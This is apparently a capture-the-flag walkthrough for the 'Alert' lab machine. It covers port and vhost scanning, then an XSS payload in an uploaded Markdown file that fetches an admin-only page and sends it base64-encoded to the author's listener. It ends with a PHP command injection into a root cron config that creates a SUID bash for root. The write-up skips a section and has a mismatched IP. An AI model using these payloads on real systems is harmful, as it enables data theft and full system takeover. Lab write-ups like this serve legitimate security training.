1. Enumeration

I started with port enumeration:

sudo nmap -p- --open -sS --min-rate 5000 -vvv -Pn -n 10.10.11.44
  • -p- --open: Scans all ports and shows open ones.
  • -sS: SYN stealth scan.
  • -vvv: Maximum verbosity for real-time results.

Ports 22 (SSH) and 80 (HTTP) are open. Service scan:

nmap -sC -sV -p22,80 10.10.11.44
  • -sC: Runs default scripts.
  • -sV: Enumerates for the version running.

The domain is alert.htb. I updated my /etc/hosts:

echo "10.10.10.11 alert.htb" | sudo tee -a /etc/hosts

Next step is vhost enumeration:

ffuf -w ~/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://alert.htb/ -H 'Host: FUZZ.alert.htb' -fl 10
  • -w ~/path/to/subdomain.txt: The wordlist used to start the fuzzing.
  • -fl: Exclude responses with a specific number of lines or range of lines.

Found a subdomain named statistics, but it requires authentication. So I moved back to the main page.

2. Web Exploitation (XSS to LFI)

On the main site, the "Markdown Viewer" allows uploading .md files.

When I visited the "About Us" page I could see this message:

The administrator checks the contact messages at "Contact us".

So step by step we check our tabs. First we will check the uploading tab "Markdown Viewer".

I sent a .md file which I created. Next I got redirected and the contents of the file were displayed.

This way I discovered it was vulnerable to XSS. I crafted a payload to leak messages.php via the administrator's session:

<script> fetch('http://alert.htb/messages.php') .then(resp => resp.text()) .then(body => { fetch("http://10.10.14.22:9200/exfil?body=" + btoa(body)); }) </script>
  • fetch('http://alert.htb/messages.php'): Makes an HTTP GET request to that page and retrieves its content.
  • .then(resp => resp.text()): Converts the response to plain text instead of JSON or binary, so body holds the full HTML/text content of the page.
  • btoa(body): Encodes the content with Base64, so it can be safely included in a URL.
  • exfil?body=...: Sends the data to our listener, which leaks the content of messages.php.

Before continuing I checked the "visualizer.php" file. I read the source code with CTRL+U and found out that the uploaded file was saved with a different name.

I found out that "Contact Us" has a form that I could fill in.

I set a listener and tried to see if there was any response.

Combining all the above, I uploaded the script discussed above as payload.md, opened a listener, and copied the link from the source code:

http://alert.htb/visualizer.php?link_share=6830997ae06754.83998933.md

The admin will check the link. This triggers the uploaded file and sends me the contents of messages.php from the admin's view.

Decoding the data revealed a hidden file path:

echo "PGgxPk1lc3NhZ2VzPC9oMT4..." | base64 -d

4. Privilege Escalation

Using the id command, I saw that Albert is part of the management group. I found a writable configuration file used by a root cronjob:

find / -group management 2>/dev/null

I injected a command into /opt/website-monitor/config/configuration.php to create a SUID bash binary:

<?php define('PATH', '/opt/website-monitor'); system('cp /bin/bash /tmp/damn; chown root:root /tmp/damn; chmod 6777 /tmp/damn;'); ?>
  • system: Runs the command inside the PHP file.
  • cp /bin/bash /tmp/damn: Copies the Bash shell to a temporary folder and renames it damn.
  • chown root:root /tmp/damn: Changes the owner of that file to root.
  • chmod 6777 /tmp/damn: Sets the SUID bit and full access permissions for everyone.

After the cronjob ran, I executed the binary with -p to get root:

/tmp/damn -p
